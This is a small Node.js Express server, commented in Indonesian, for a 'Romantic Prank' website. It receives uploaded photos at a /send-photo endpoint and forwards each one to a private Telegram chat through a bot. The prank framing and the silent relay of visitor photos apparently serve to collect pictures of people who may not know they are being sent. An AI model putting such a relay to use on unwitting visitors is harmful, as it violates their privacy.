const express = require('express');
const path = require('path');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
const PORT = 3000;

// ===============================
// TELEGRAM CONFIG
// ===============================
// Jangan taruh token di public/script.js.
// Isi melalui environment variable:
// $env:TELEGRAM_BOT_TOKEN="TOKEN_KAMU"
// $env:TELEGRAM_CHAT_ID="CHAT_ID_KAMU"

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ===============================
// FILE UPLOAD
// ===============================

const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 10 * 1024 * 1024
  }
});

// ===============================
// STATIC WEBSITE
// ===============================

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===============================
// SEND PHOTO TO TELEGRAM
// ===============================

app.post('/send-photo', upload.single('photo'), async (req, res) => {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({
        ok: false,
        error: 'Telegram belum dikonfigurasi di server.'
      });
    }

    if (!req.file) {
      return res.status(400).json({
        ok: false,
        error: 'Foto tidak ditemukan.'
      });
    }

    const form = new FormData();

    form.append('chat_id', TELEGRAM_CHAT_ID);

    form.append(
      'photo',
      req.file.buffer,
      {
        filename: 'romantic-prank.jpg',
        contentType: req.file.mimetype
      }
    );

    form.append(
      'caption',
      '❤️ Foto dari Romantic Prank'
    );

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
      {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
      }
    );

    const data = await response.json();

    if (!data.ok) {
      console.error('Telegram API error:', data);

      return res.status(500).json({
        ok: false,
        error: 'Telegram gagal mengirim foto.'
      });
    }

    console.log('📸 Foto berhasil dikirim ke Telegram.');

    res.json({
      ok: true
    });

  } catch (error) {
    console.error('Server error:', error);

    res.status(500).json({
      ok: false,
      error: 'Terjadi kesalahan pada server.'
    });
  }
});

// ===============================
// START SERVER
// ===============================

app.listen(PORT, () => {
  console.log('');
  console.log('❤️ Romantic Prank Server');
  console.log(`🌐 http://localhost:${PORT}`);
  console.log('');
});
